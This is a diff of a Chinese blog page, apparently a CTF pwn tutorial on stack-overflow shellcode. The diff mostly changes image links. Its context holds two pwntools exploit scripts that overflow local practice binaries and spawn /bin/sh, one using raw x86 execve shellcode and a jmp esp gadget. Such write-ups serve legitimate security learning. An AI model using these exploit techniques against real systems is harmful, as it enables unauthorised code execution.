@@ -23,16 +23,16 @@
 <meta property="og:site_name" content="能打八个攻城狮">
 <meta property="og:description" content="什么是ShellcodeShellcode指的是用来完成某个功能的汇编代码，常用的功能就是获取目标系统的shell。在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行Shellcode，就要要求对应的二进制文件没有开启NX保护。利用ret_address返回Shellcode处执行 怎么生成ShellcodeShellcode的生成方法通常有以下几种：  在pwntools中由shellcr">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2024/07/18/hello-world/40174-20240615224646225-696758059.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182336382.png">
 <meta property="og:image" content="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240615224824896-1789253128.png">
-<meta property="og:image" content="http://example.com/2024/07/18/hello-world/40174-20240615225943864-1256445096.png">
-<meta property="og:image" content="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240615230113982-2038105599.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337778.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337746.png">
 <meta property="article:published_time" content="2024-07-18T08:06:06.000Z">
-<meta property="article:modified_time" content="2024-07-18T13:39:52.275Z">
+<meta property="article:modified_time" content="2024-07-18T15:37:29.428Z">
 <meta property="article:author" content="TKYmax">
 <meta property="article:tag" content="栈">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2024/07/18/hello-world/40174-20240615224646225-696758059.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182336382.png">
   
   
   
@@ -312,10 +312,10 @@
 <li>在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes/">https://www.exploit-db.com/shellcodes/</a>网站中根据平台和系统的位数获取</li>
 <li>通过Metasploit生成</li>
 </ol>
-<h3 id="1、根据pwntools生成Shellcode"><a href="#1、根据pwntools生成Shellcode" class="headerlink" title="1、根据pwntools生成Shellcode"></a>1、根据pwntools生成Shellcode</h3><p>例题：<a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode">https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode</a><br><img src="/2024/07/18/hello-world/40174-20240615224646225-696758059.png" srcset="/img/loading.gif" lazyload><br>查看保护没有开NX，可以用Shellcode<br><img src="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240615224824896-1789253128.png" srcset="/img/loading.gif" lazyload><br>IDA反编译发现栈溢出，直接用Shellcode覆盖main_addr地址控制程序流</p>
+<h3 id="1、根据pwntools生成Shellcode"><a href="#1、根据pwntools生成Shellcode" class="headerlink" title="1、根据pwntools生成Shellcode"></a>1、根据pwntools生成Shellcode</h3><p>例题：<a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode">https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182336382.png" srcset="/img/loading.gif" lazyload><br>查看保护没有开NX，可以用Shellcode<br><img src="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240615224824896-1789253128.png" srcset="/img/loading.gif" lazyload><br>IDA反编译发现栈溢出，直接用Shellcode覆盖main_addr地址控制程序流</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>context.arch = &quot;i386&quot;<br>p = process(&#x27;./ret2shellcode&#x27;)<br>p.recvuntil(&quot;ret2shellcode&quot;)<br>target = int(p.recvuntile(&quot;\n&quot;,drop = true) , 16)<br>sc = asm(shellcraft.sh())<br>payload = sc.ljust(0x108 ,&#x27;\x00&#x27;) + p32(1) + p32(target)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 <p><strong>解释：target &#x3D; int(p.recvuntile(“\n”,drop &#x3D; true) , 16)接收直到换行符，并且去除换行符，转换为16进制</strong></p>
-<h2 id="2、Shellcode进阶"><a href="#2、Shellcode进阶" class="headerlink" title="2、Shellcode进阶"></a>2、Shellcode进阶</h2><p>例题：<a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w">https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w</a><br><img src="/2024/07/18/hello-world/40174-20240615225943864-1256445096.png" srcset="/img/loading.gif" lazyload><br><strong>没有开NX保护，可以使用Shellccode</strong><br><img src="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240615230113982-2038105599.png" srcset="/img/loading.gif" lazyload><br><strong>发现溢出十八个字节，非常小，所以用pwntools生成的Shellcode长度太长，这里需要用gadget来控制EIP的位置，跳转到Shellcode的初始地址</strong></p>
+<h2 id="2、Shellcode进阶"><a href="#2、Shellcode进阶" class="headerlink" title="2、Shellcode进阶"></a>2、Shellcode进阶</h2><p>例题：<a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w">https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337778.png" srcset="/img/loading.gif" lazyload><br><strong>没有开NX保护，可以使用Shellccode</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337746.png" srcset="/img/loading.gif" lazyload><br><strong>发现溢出十八个字节，非常小，所以用pwntools生成的Shellcode长度太长，这里需要用gadget来控制EIP的位置，跳转到Shellcode的初始地址</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>p = process(&#x27;./b0verfl0w&#x27;)<br><br>shellcode_x86 = &#x27;\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80&#x27;<br>sub_esp_jmp = asm(&#x27;sub esp , 0x28;jmp esp&#x27;)<br>jmp_esp = 0x08048504<br>payload = shellcode_x86.ljust(0x24 , &#x27;a&#x27;) +  p32(jmp_esp) + sub_esp_jmp<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 <p><strong>从payload起始地址开始构造Shellcode，之后调整esp到Shellcode起始位置</strong>、</p>
 <blockquote>
